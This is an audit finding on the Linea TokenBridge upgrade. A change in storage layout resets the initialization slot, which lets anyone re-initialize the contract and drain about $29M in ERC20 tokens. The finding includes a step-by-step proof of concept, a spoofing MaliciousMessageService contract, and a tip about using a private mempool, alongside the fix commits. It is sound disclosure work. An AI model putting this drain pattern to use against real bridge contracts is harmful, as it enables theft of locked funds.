---
tags:
  - lang/solidity
  - sector/bridge
  - sector/token
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - precondition/uninitialized
protocol: "[[Linea]]"
auditors:
  - "[[Dacian]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-27-cyfrin-linea-mixed-upgrade-v2.0.md"
genome:
  - "[[missing-auth]]"
  - "[[data/uninitialized]]"
  - "[[direct-drain]]"
  - "[[bridge-sender-auth]]"
  - "[[frontrun-exposure]]"
  - "[[initializer-auth]]"
  - "[[reentrancy-guard]]"
  - "[[upgrade-safety]]"
---
# After the upgrade permissionless attacker can fully drain the L1 `TokenBridge` of `ERC20` tokens currently valued around $29M USD

- id: 65618
- impact: HIGH
- protocol: [[Linea]] Mixed Upgrade
- reporter: Dacian (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-27-cyfrin-linea-mixed-upgrade-v2.0.md

## Summary


The bug report discusses an issue with the `TokenBridge` contracts, where after an upgrade, the initialization slot changes and becomes vulnerable to attacks. This allows an attacker to drain the L1 `TokenBridge` contract of ERC20 tokens, which are currently valued at around $29M USD. The report also provides a proof of concept for how an attacker can exploit this vulnerability and recommends a mitigation strategy to fix the issue. The bug was introduced in a recent update and has been fixed in the latest commit.

## Details

**Description:** Using `forge inspect -R "@openzeppelin/=contracts/node_modules/@openzeppelin/" --hardhat TokenBridge storageLayout` on both the new and old `TokenBridge` contracts to carefully examine their exact storage layout showed that:
* slot 0 which used to be initialization slot becomes a gap
* slot 50 which used to be a gap becomes the new initialization slot

**Impact:** Immediately following the upgrade, the `TokenBridge` contract will believe it is not initialized allowing a permissionless attacker to initialize it. An attacker can weaponize this to completely drain the L1 `TokenBridge` contract of ERC20 tokens which at the time of this audit are [valued around $29M USD](https://etherscan.io/address/0x051F1D88f0aF5763fB888eC4378b4D8B29ea3319).

**Proof of Concept:** Immediately following the upgrade:
1. Attacker calls `TokenBridge::initialize` to set themselves as default admin
2. Attacker calls `TokenBridge::grantRole(SET_MESSAGE_SERVICE_ROLE, attacker)` to give themselves permission to set messaging service address
3. Attacker deploys a malicious messaging service contract such as:
```solidity
contract MaliciousMessageService {
    address public targetRemoteSender;

    constructor(address _remoteSender) {
        targetRemoteSender = _remoteSender;
    }

    // Spoofs the remoteSender check
    function sender() external view returns (address) {
        return targetRemoteSender;
    }

    // Calls TokenBridge as msg.sender to pass onlyMessagingService
    function drain(
        ITokenBridge bridge,
        address token,
        uint256 amount,
        address recipient,
        uint256 chainId
    ) external {
        bridge.completeBridging(token, amount, recipient, chainId, "");
    }
}
```
4. Attacker sets it by calling `TokenBridge::setMessageService(maliciousMessageService)`
5. Attacker calls the `drain` function on their malicious messaging service for every token locked in the L1 `TokenBridge`
6. `TokenBridge::_completeBridging` calls `IERC20Upgradeable(_nativeToken).safeTransfer(_recipient, _amount)` to send the attacker the locked tokens

This attack can be executed atomically and via a private mempool such as flashbots (to prevent front-running) making it unstoppable and completely draining the L1 `TokenBridge`.

**Recommended Mitigation:** `TokenBridgeBase` should inherit from `Initializable`. In an older version `TokenBridge` inherited from `Initializable` but this was later changed to inherit from OZ `ReentrancyGuardUpgradeable`, which itself inherits from `Initializable` so everything was still OK.

The bug appears to have been introduced on Nov 7th 2025 in commit [0c8bee7](https://github.com/Consensys/linea-monorepo/commit/0c8bee77311c694ba9c8643356f9703b9c88394b#diff-aff2d4ab7e0847d160464ca3171cd9a427be1e9503a4feffaaa6207fc83237efL31-R31) which swapped out OZ `ReentrancyGuardUpgradeable` for the new custom `TransientStorageReentrancyGuardUpgradeable`. This new contract doesn't inherit from `Initializable` which changed the `TokenBridge` inheritance hierarchy and hence storage slots.

**Linea:** Fixed in commit [4882f33](https://github.com/Consensys/linea-monorepo/pull/2007/commits/4882f33de707085f01e54c89d090c6fba76f33a4).

**Cyfrin:** Verified; the fix results in the initialization slot being preserved at slot 0. Slot 1 which used to be `_status` now becomes a gap and using `cast storage 0x051F1D88f0aF5763fB888eC4378b4D8B29ea3319 1` shows that on Mainnet L1 `TokenBridge`, slot 1 (currently `_status`) is already set to 1. Consider using a `reinitializer` to wipe slot 1 "clean" as it becomes a gap.

**Linea:** Added the wiping of slot 1 in commit [d99f590](https://github.com/Consensys/linea-monorepo/pull/2007/commits/d99f5906ec95102cdc67fb27039b26d15ef52a1e).

\clearpage
